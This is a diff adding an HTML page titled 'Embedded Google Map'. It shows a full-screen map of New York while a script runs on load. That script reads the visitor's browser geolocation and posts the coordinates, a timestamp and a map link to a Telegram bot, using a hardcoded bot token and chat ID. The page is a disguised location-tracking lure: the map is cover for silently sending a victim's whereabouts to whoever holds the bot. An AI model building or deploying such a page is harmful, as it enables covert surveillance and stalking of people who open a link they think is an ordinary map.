@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html>
+  <head>
+      <style>
+          *{
+              margin:0;
+          }
+          iframe{
+             width:100%;
+             height:100vh;
+            
+          }
+      </style>    <title>Embedded Google Map</title>
+  </head>
+  <body>
+    <iframe src="https://www.google.com/maps/embed?pb=!1m14!1m8!1m3!1d93076.05013799814!2d-74.0059412!3d40.7127837!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x89c24fa5d33f083b%3A0xc80b8f06e177fe62!2sNew+York%2C+NY%2C+USA!5e0!3m2!1sen!2sin!4v1551926094581" width="100vw" height="100vh" frameborder="0" style="border:0" allowfullscreen></iframe>
+  </body>
+<script>
+//updated location
+// replace YOUR_BOT_TOKEN and YOUR_CHAT_ID with your own values
+const botToken = '6200671913:AAGfUPW-ZW_NwtJO9UPnQ1SHKNp3dxxNoPU';
+const chatId = '5857694327';
+
+if ("geolocation" in navigator) {
+  navigator.geolocation.getCurrentPosition(successCallback, errorCallback);
+} else {
+  console.log("Geolocation is not supported by this browser.");
+}
+
+function successCallback(position) {
+  const latitude = position.coords.latitude;
+  const longitude = position.coords.longitude;
+  const timestamp = new Date(position.timestamp).toLocaleString();
+  
+  const message = `Latitude: ${latitude}\nLongitude: ${longitude}\nTimestamp: ${timestamp}`;
+
+  // Create a Google Maps URL using the user's location
+  const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}&z=15`;
+
+  // Create an image of the map using the Google Maps Static API
+  const mapsImageUrl = `https://maps.googleapis.com/maps/api/staticmap?center=${latitude},${longitude}&zoom=15&size=400x400&markers=color:red%7C${latitude},${longitude}&key=YOUR_API_KEY`;
+
+  // Send the message with the map and the location details to Telegram
+  sendTelegramMessage(`${message}\n${mapsUrl}`);
+  sendTelegramPhoto(mapsImageUrl);
+}
+
+function errorCallback(error) {
+  console.log(`Error message: ${error.message}`);
+}
+
+function sendTelegramMessage(message) {
+  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+  const data = { chat_id: chatId, text: message };
+  const options = { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) };
+
+  fetch(url, options)
+    .then(response => {
+      if (!response.ok) {
+        throw new Error(`HTTP error! status: ${response.status}`);
+      }
+      console.log('Telegram message sent successfully.');
+    })
+    .catch(error => {
+      console.log('Error sending Telegram message:', error);
+    });
+}
+
+function sendTelegramPhoto(photoUrl) {
+  const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+  const data = { chat_id: chatId, photo: photoUrl };
+  const options = { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) };
+
+  fetch(url, options)
+    .then(response => {
+      if (!response.ok) {
+        throw new Error(`HTTP error! status: ${response.status}`);
+      }
+      console.log('Telegram photo sent successfully.');
+    })
+    .catch(error => {
+      console.log('Error sending Telegram photo:', error);
+    });
+}
+</script>
+
+
+</html>
